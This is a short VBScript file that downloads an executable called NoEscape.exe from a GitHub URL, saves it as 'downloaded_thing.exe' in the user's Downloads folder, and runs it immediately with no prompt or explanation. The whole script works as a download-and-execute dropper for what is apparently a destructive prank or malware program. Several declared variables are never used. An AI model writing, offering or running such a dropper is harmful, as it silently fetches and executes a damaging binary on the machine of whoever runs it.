dim result
Dim timestamp
Dim speaks, speech
dim wallpaperPath
Dim objShell, fso
Set objShell = CreateObject("WScript.Shell")
Dim http, stream
Dim url, savePath
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
Dim filePath, xml 
dim userprofile


url = "https://github.com/roadmanlazer/NoEscape.exe-Download/blob/main/NoEscape.exe/NoEscape.exe"

userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%")
filePath = userProfile & "\Downloads\downloaded_thing.exe"

Set xml = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xml.Open "GET", url, False
xml.Send

If xml.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' binary
    stream.Open
    stream.Write xml.ResponseBody
    stream.SaveToFile filePath, 2 ' overwrite
    stream.Close

    shell.Run filePath, 1, False
Else
    MsgBox "Download failed: " & xml.Status
End If
